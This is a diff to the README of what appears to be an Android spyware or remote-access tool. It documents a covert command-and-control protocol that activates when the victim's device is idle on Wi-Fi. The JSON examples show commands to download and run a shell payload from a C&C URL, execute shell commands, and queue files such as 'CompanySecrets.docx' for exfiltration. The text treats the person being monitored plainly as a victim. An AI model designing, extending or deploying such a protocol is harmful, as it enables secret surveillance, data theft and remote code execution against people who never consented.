@@ -73,17 +73,82 @@ public key and queued for upload when the victim connects to Wi-Fi.
 
 Supported Operations
 --------------------
-+ Automatic keystroke uploads when user is sleeping and connected to Wi-Fi
-+ Execute shell commands
-+ Download payload from URL
-+ Add upload job to queue
++ Queue files for upload when device is idle and connected to Wi-Fi
++ Execute shell commands from the C&C
 
 Push Service
 ------------
-Since Google doesn't let us silently receive background messages (for obvious reasons),
-we'll have to do it ourselves using the JobScheduler API to poll for commands when
-the device is charging and connected to Wi-Fi.
-This means that we'll be giving up real time communication with the device.
+The CommandSocketService is started whenever the device is idle and connected to an
+unmetered network.
+It opens a Websocket connection to the C&C and listens for commands.
+On startup, the client signals it is ready to receive commands by sending its unique
+Android device ID.
+When the user disconnects from the unmetered network, this service should stop
+immediately and close the socket.
+All messages between client and server represent remote function calls.
+
+#####Message Format
+Key | Type | Description
+--------------------------
+command | String | The function to be called on the remote end.
+arguments | Map(String -> Object) | Arguments to be passed to the function.
+nonce | String | A unique ID to allow for tracking of command execution. The nonce does not have to be random but must be unique
+
+#####Ready
+To signal that it is ready to execute commands, the device sends a message with its unique
+Android device ID.
+
+```
+{
+    "command": "ready",
+    "nonce": "1234-5467-4353-6467",
+    "arguments": {
+        "deviceId": "2342DFS4355"
+    }
+}
+```
+
+#####Execute
+The `execute` command allows the server to download and run a shell script payload.
+```
+{
+    "command": "execute",
+    "nonce": "1234-5467-4353-6468"
+    "arguments": {
+        "url": "https://commandandcontrol.com/payload.sh"
+    }
+}
+```
+
+
+#####Upload
+The `upload` command allows the server to queue a file on the device for uploading when the device
+is idle and connected to an unmetered network.
+```
+{
+    "command": "upload",
+    "nonce": "1234-5467-4353-1359"
+    "arguments": {
+        "filename": "/sdcard/Documents/CompanySecrets.docx"
+    }
+}
+```
+
+#####Reply
+Sometimes, the output of a command is useful.
+The `reply` command should be used to send a reply, and is supported by both client and server.
+Since there is no guarantee that commands will execute in order, the nonce should be used to
+track which command the response is for.
+```
+{
+    "command": "reply"
+    "nonce": "1234-5467-4312-0987"
+    "arguments": {
+        "command": "1234-5467-4353-1359",
+        "output": "/sdcard/Documents/CompanySecrets.docx queued for upload."
+    }
+}
+```
 
 Disclaimer
 ==========
